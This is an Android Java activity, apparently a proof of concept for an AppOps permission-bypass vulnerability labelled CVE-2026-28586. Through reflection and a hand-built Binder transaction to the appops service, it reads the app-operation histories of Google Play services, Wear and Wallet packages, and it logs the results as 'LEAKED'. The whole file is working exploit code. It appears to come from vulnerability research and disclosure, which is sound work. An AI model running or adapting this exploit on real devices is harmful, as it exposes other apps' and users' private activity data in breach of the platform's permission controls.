package com.vrp.appops;

import android.app.Activity;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;
import java.lang.reflect.Method;
import java.util.List;

public class AppOpsTestActivity extends Activity {
    private static final String TAG = "VRP_APPOPS";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        final TextView tv = new TextView(this);
        tv.setPadding(16, 16, 16, 16);
        tv.setTextSize(8f);
        sv.addView(tv);
        setContentView(sv);

        new Thread(() -> {
            StringBuilder sb = new StringBuilder();
            sb.append("=== CVE-2026-28586: AppOps Bypass ===\n");
            sb.append("UID: ").append(android.os.Process.myUid()).append("\n\n");
            Log.i(TAG, "START UID=" + android.os.Process.myUid());

            AppOpsManager aom = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);

            String[] targets = {
                "com.google.android.gms",
                "com.google.wear.services",
                "com.google.android.wearable.app",
                "com.google.android.apps.walletnfcrel"
            };

            for (String pkg : targets) {
                try {
                    int uid = getPackageManager().getApplicationInfo(pkg, 0).uid;
                    sb.append("--- ").append(pkg).append(" (").append(uid).append(") ---\n");
                    try {
                        Method getOps = AppOpsManager.class.getMethod(
                            "getOpsForPackage", int.class, String.class, int[].class);
                        Object result = getOps.invoke(aom, uid, pkg, null);
                        if (result != null) {
                            List<?> entries = (List<?>) result;
                            sb.append("LEAKED ").append(entries.size()).append(" entries\n");
                            for (Object e : entries) sb.append("  ").append(e).append("\n");
                            Log.i(TAG, "LEAK " + pkg + " " + entries.size());
                        } else {
                            sb.append("null\n");
                        }
                    } catch (Exception e) {
                        sb.append(e.getClass().getSimpleName()).append(": ").append(e.getMessage()).append("\n");
                        Log.i(TAG, pkg + ": " + e.getMessage());
                    }
                } catch (PackageManager.NameNotFoundException e) {
                    sb.append("--- ").append(pkg).append(" NOT INSTALLED ---\n");
                }
            }

            sb.append("\n=== Direct Binder ===\n");
            try {
                Class<?> sm = Class.forName("android.os.ServiceManager");
                Method gs = sm.getMethod("getService", String.class);
                IBinder b = (IBinder) gs.invoke(null, "appops");
                if (b != null) {
                    sb.append("Interface: ").append(b.getInterfaceDescriptor()).append("\n");
                    for (String pkg : targets) {
                        try {
                            int uid = getPackageManager().getApplicationInfo(pkg, 0).uid;
                            Parcel d = Parcel.obtain();
                            Parcel r = Parcel.obtain();
                            try {
                                d.writeInterfaceToken("com.android.internal.app.IAppOpsService");
                                d.writeInt(uid);
                                d.writeString(pkg);
                                d.writeInt(-1);
                                b.transact(3, d, r, 0);
                                r.setDataPosition(0);
                                try {
                                    r.readException();
                                    int avail = r.dataAvail();
                                    sb.append(pkg).append(": avail=").append(avail);
                                    if (avail > 0) {
                                        int sz = r.readInt();
                                        sb.append(" list=").append(sz);
                                        if (sz > 0) {
                                            sb.append(" LEAKED!");
                                            Log.i(TAG, "BINDER_LEAK " + pkg + " " + sz);
                                        }
                                    }
                                    sb.append("\n");
                                } catch (Exception ex) {
                                    sb.append(pkg).append(": ").append(ex.getMessage()).append("\n");
                                    Log.i(TAG, "Binder " + pkg + ": " + ex.getMessage());
                                }
                            } finally {
                                d.recycle();
                                r.recycle();
                            }
                        } catch (PackageManager.NameNotFoundException e) {
                            sb.append(pkg).append(": N/A\n");
                        }
                    }
                }
            } catch (Exception e) {
                sb.append("Error: ").append(e.getMessage()).append("\n");
            }

            final String out = sb.toString();
            Log.i(TAG, "\n" + out);
            runOnUiThread(() -> tv.setText(out));
        }).start();
    }
}
